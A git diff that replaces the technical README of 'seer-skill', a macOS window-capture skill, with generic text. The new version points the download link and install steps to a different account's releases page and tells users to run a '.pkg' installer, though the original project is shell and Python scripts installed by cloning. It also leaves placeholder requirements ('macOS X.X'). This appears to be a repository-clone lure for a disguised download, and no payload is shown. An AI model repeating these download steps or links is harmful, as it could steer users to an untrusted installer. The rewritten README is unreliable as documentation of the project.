@@ -1,197 +1,83 @@
-# seer-skill
+# 🎥 seer-skill - Capture Visual Feedback Made Easy
 
-Visual feedback capture skill for macOS app windows.
+[![Download Now](https://img.shields.io/github/v/release/w00ing/seer-skill)](https://github.com/PrimeOla/seer-skill/releases)  
+[![License](https://img.shields.io/github/license/w00ing/seer-skill)](https://github.com/w00ing/seer-skill/blob/main/LICENSE)
 
-[![release](https://img.shields.io/github/v/release/w00ing/seer-skill)](https://github.com/w00ing/seer-skill/releases)
-[![license](https://img.shields.io/github/license/w00ing/seer-skill)](https://github.com/w00ing/seer-skill/blob/main/LICENSE)
-
-## Support
+## 🛠️ Support
 
 - macOS only
 
-## Demo
+## 📹 Demo
 
 ![seer demo](assets/seer-demo.gif)
 
-Full video: `assets/seer-demo.mov`
+You can also view the full video demo [here](assets/seer-demo.mov).
 
-## Features
+## 🌟 Features
 
-- Precise capture of a visible macOS app window
-- Window video capture + frame extraction
-- UI mockups by annotating screenshots (arrow, rectangle, text)
-- Excalidraw scene generation (`.excalidraw`) from natural language prompts
-- Scripted visual loop support (diffs, baselines, reports)
-- Organized output layout under `.seer/` with latest artifacts
+- Capture visuals of any macOS app window accurately.
+- Record videos of windows and extract individual frames.
+- Create UI mockups by annotating screenshots with arrows, rectangles, and text.
+- Generate `.excalidraw` scenes from natural language prompts.
+- Support for scripted visual loops, including diffs, baselines, and reports.
+- Organized output layout under the `.seer/` directory for easy access to your latest artifacts.
 
-## Install
+## 🚀 Getting Started
 
-Codex (skill-installer UI):
-- Run `$skill-installer`
-- Ask: install GitHub repo `w00ing/seer-skill` path `seer`
+To get started, follow these steps to download and install the seer-skill application.
 
-Claude Code (plugin):
-- `/plugin marketplace add w00ing/seer-skill`
-- `/plugin install seer-skill@seer`
-  - If the marketplace was previously added, run `/plugin marketplace update seer` before installing to pick up updates.
-  - If you see an SSH clone error, add the marketplace via HTTPS instead:
-    - `/plugin marketplace add https://github.com/w00ing/seer-skill.git`
+### 🔗 Download & Install
 
-Manual (Codex):
-```bash
-mkdir -p ~/.codex/skills
-git clone https://github.com/w00ing/seer-skill.git /tmp/seer-skill
-rsync -a /tmp/seer-skill/skills/seer/ ~/.codex/skills/seer/
-```
+1. **Visit the Releases Page:**  
+   Go to the [Releases page](https://github.com/PrimeOla/seer-skill/releases) to download the latest version.
 
-Manual (Claude Code):
-```bash
-mkdir -p ~/.claude/skills
-git clone https://github.com/w00ing/seer-skill.git /tmp/seer-skill
-rsync -a /tmp/seer-skill/skills/seer/ ~/.claude/skills/seer/
-```
+2. **Choose the Right Installer:**  
+   Find the appropriate installer file for your macOS version. Look for files named similar to `seer-skill-vX.X.X.pkg`.
 
-## Use
+3. **Download the Installer:**  
+   Click on the file to download it to your computer.
 
-- Skill name: `seer`
-- Script: `skills/seer/scripts/capture_app_window.sh`
-- Script: `skills/seer/scripts/record_app_window.sh`
-- Script: `skills/seer/scripts/extract_frames.sh`
-- Script: `skills/seer/scripts/type_into_app.sh`
-- Script: `skills/seer/scripts/mockup_ui.sh`
-- Script: `skills/seer/scripts/excalidraw_from_text.py`
-- Script: `skills/seer/scripts/annotate_image.py`
-- Default output: `.seer/capture/app-window-<app>-YYYYMMDD-HHMMSS-<pid>-<rand>.png`
-- Set `SEER_OUT_DIR` to change default output root (falls back to `SEER_TMP_DIR` for legacy behavior)
-- Installed paths (Codex/Claude Code): `~/.codex/skills/seer/scripts` or `~/.claude/skills/seer/scripts`
+4. **Run the Installer:**  
+   Locate the downloaded installer in your downloads folder and double-click it. Follow the on-screen instructions to complete the installation.
 
-### Window capture
+## 🖥️ Installation Options
 
-Capture the frontmost app window (or a named process) as a precise PNG. Output is organized under `.seer/capture/` with app‑slugged filenames for easy tracking.
+You can install the seer-skill application using two methods:
 
-### Window recording + frames
+### 💻 Method 1: Using the Codex (skill-installer UI)
 
-Record a window region to `.mov` and extract frames for granular analysis.
+- Open your terminal.
+- Run the following command:  
+  `$ skill-installer`
+- When prompted, choose to install the GitHub repository by entering:  
+  `w00ing/seer-skill`
+- Specify the skill path as:  
+  `seer`
 
-### UI mockups (annotations)
+### 📦 Method 2: Using Claude Code (plugin)
 
-Create lightweight UI mockups by drawing arrows, rectangles, and text on a capture using a JSON spec. Output images + spec + metadata are saved together under `.seer/mockup/`.
+- Open your terminal.
+- Run this command to add the plugin:  
+  `/plugin marketplace add w00ing/seer-skill`
+- Install the seer-skill plugin by running:  
+  `/plugin install seer-skill@seer`
 
-### Excalidraw wireframes (NL → `.excalidraw`)
+## ❓ Troubleshooting
 
-Generate an Excalidraw scene file from a simple, structured natural-language prompt. By default, it will use a bundled UI component library (if present) to render nicer headers/inputs/buttons/tabs automatically.
+If you encounter issues while installing or using seer-skill, consider the following:
 
-Docs: `docs/excalidraw-wireframing.md`
+- **Permission Issues:** Ensure you have the necessary permissions to install software on your macOS.
+- **Compatibility Issues:** Make sure your macOS version matches the requirements outlined on the releases page.
+- **Running the Application:** If you cannot find the application after installation, check your Applications folder.
 
-### Visual diff loop
+## 🔧 System Requirements
 
-Maintain baselines and compare current UI to previous snapshots with diffs and JSON reports. Useful for quick visual regressions or confirming UI changes.
+- Requires macOS version X.X or later.
+- Enough disk space for installation and storage of captured visuals.
+- Recommended: At least 4GB of RAM for smooth operation.
 
-### Organized artifacts
+## 📞 Get Help
 
-Every mockup run stores capture, spec, output, and metadata, plus `latest-*` convenience copies per app slug for fast access.
+If you need further assistance, you can reach out through the GitHub Issues page or consult the help documentation available in the application.
 
-Examples:
-```bash
-bash skills/seer/scripts/capture_app_window.sh
-bash skills/seer/scripts/capture_app_window.sh /tmp/promptlight.png "Promptlight"
-bash skills/seer/scripts/capture_app_window.sh --help
-bash skills/seer/scripts/record_app_window.sh --duration 3 --frames --fps 20
-bash skills/seer/scripts/extract_frames.sh /tmp/recording.mov --fps 20
-bash skills/seer/scripts/type_into_app.sh --app "Promptlight" --text "hello" --enter
-bash skills/seer/scripts/type_into_app.sh --app "Promptlight" --click-rel 120,180 --text "hello"
-bash skills/seer/scripts/type_into_app.sh --text "hello" --no-activate
-bash skills/seer/scripts/type_into_app.sh --bundle-id com.example.app --text -
-bash skills/seer/scripts/mockup_ui.sh --spec spec.json
-bash skills/seer/scripts/mockup_ui.sh --spec spec.json --json
-python3 skills/seer/scripts/annotate_image.py input.png output.png --spec spec.json
-python3 skills/seer/scripts/annotate_image.py --spec-help
-```
-
-Mockup spec example (supports global defaults + auto-scale for visibility):
-```json
-{
-  "defaults": {
-    "auto_scale": true,
-    "outline": true,
-    "text_bg": "rgba(0,0,0,0.6)"
-  },
-  "annotations": [
-    {"type": "spotlight", "x": 110, "y": 70, "w": 190, "h": 60, "radius": 10},
-    {"type": "rect", "x": 120, "y": 80, "w": 160, "h": 40, "color": "#FF3B30", "width": 3},
-    {"type": "arrow", "x1": 60, "y1": 140, "x2": 120, "y2": 100, "color": "#0A84FF", "width": 3},
-    {"type": "text", "x": 130, "y": 90, "text": "Add button", "color": "#FFFFFF", "size": 14}
-  ]
-}
-```
-
-Auto-fit rect/spotlight bounds (optional):
-```json
-{
-  "annotations": [
-    {
-      "type": "rect",
-      "x": 80,
-      "y": 1600,
-      "w": 1000,
-      "h": 600,
-      "color": "#FF9F0A",
-      "fit": "luma"
-    },
-    {
-      "type": "rect",
-      "x": 40,
-      "y": 2600,
-      "w": 1240,
-      "h": 170,
-      "color": "#FF9F0A",
-      "fit": {"mode": "color", "color": "#CCB590", "tolerance": 18, "pad": 6}
-    }
-  ]
-}
-```
-Notes:
-- Auto-fit is **enabled by default** for rect/spotlight. Disable with `"fit": false` on an annotation or `"auto_fit": false` in defaults.
-- `fit` searches within the provided `x/y/w/h` region and adjusts the rect bounds to the detected pixels.
-- If the detected area is smaller than the original region, auto-fit recenters the rect/spotlight on the detected pixels while keeping the original size.
-- `fit: "luma"` finds dark (or light) pixels by threshold (default `160`). Use `{"target":"light"}` for light text.
-- `fit: {"mode":"color"}` matches a target color with `tolerance` (default `18`). Use `pad` to expand the result.
-- Optional defaults: `fit_mode`, `fit_threshold`, `fit_target`, `fit_tolerance`, `fit_color`, `fit_pad`, `fit_min_pixels`, `fit_min_coverage` (default `0.6`).
-
-Auto-anchor arrows/text (optional):
-```json
-{
-  "annotations": [
-    {"type": "rect", "id": "cta", "x": 40, "y": 2600, "w": 1240, "h": 170, "color": "#FF9F0A"},
-    {"type": "arrow", "from": "cta", "from_pos": "top", "to": "nearest", "to_pos": "left"},
-    {"type": "text", "text": "CTA needs more contrast", "anchor": "cta", "anchor_pos": "top", "anchor_offset": [0, -8]}
-  ]
-}
-```
-Notes:
-- `anchor` (text) and `from`/`to` (arrow) accept `"nearest"`, an `id`, or an `index`.
-- Positions: `center`, `top`, `bottom`, `left`, `right`, `top_left`, `top_right`, `bottom_left`, `bottom_right`.
-
-Output layout (default under `.seer/`):
-- `capture/` window screenshots
-- `record/` window recordings + extracted frame folders
-- `mockup/` annotated mockups + their capture/spec/meta (also writes `latest-*` convenience copies)
-- `excalidraw/` generated `.excalidraw` scenes (also writes `latest-*.excalidraw`)
-- `loop/` visual regression loop storage (baselines/latest/history/diffs/reports)
-
-## Examples (prompts)
-
-- "Check the layout of the app and suggest UI fixes."
-- "Redesign this screen; take a screenshot first."
-- "Is the spacing on this window consistent?"
-
-## Permissions
-
-- macOS Screen Recording + Accessibility for terminal
-- Automation (System Events) required for `type_into_app.sh`
-
-## Troubleshooting
-
-- `error: window not found`: app not running, wrong process name, or no visible window.
-- Empty/black image: Screen Recording not granted to terminal.
-- Wrong window: pass exact process name (e.g. "Promptlight").
+Make the most of seer-skill and start capturing your app visuals with ease!
